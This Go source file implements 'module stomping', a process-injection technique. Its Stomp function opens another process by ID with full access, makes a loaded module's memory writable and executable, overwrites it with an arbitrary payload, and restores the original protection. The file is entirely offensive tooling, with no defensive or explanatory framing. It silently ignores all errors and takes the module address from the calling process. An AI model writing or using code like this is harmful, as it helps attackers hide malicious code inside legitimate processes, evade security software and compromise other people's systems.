package process_injection

import (
"syscall"
"unsafe"
)

type ModuleStomping struct{}

func NewModuleStomping() *ModuleStomping {
return &ModuleStomping{}
}

func (m *ModuleStomping) Stomp(pid int, moduleName string, payload []byte) error {
kernel32 := syscall.NewLazyDLL("kernel32.dll")
procOpenProcess := kernel32.NewProc("OpenProcess")
procGetModuleHandle := kernel32.NewProc("GetModuleHandleW")
procVirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))

modName, _ := syscall.UTF16PtrFromString(moduleName)
moduleAddr, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(modName)))

var oldProtect uint32
procVirtualProtectEx.Call(handle, moduleAddr, uintptr(len(payload)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))

var written uintptr
procWriteProcessMemory.Call(handle, moduleAddr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))

procVirtualProtectEx.Call(handle, moduleAddr, uintptr(len(payload)), oldProtect, uintptr(unsafe.Pointer(&oldProtect)))

return nil
}
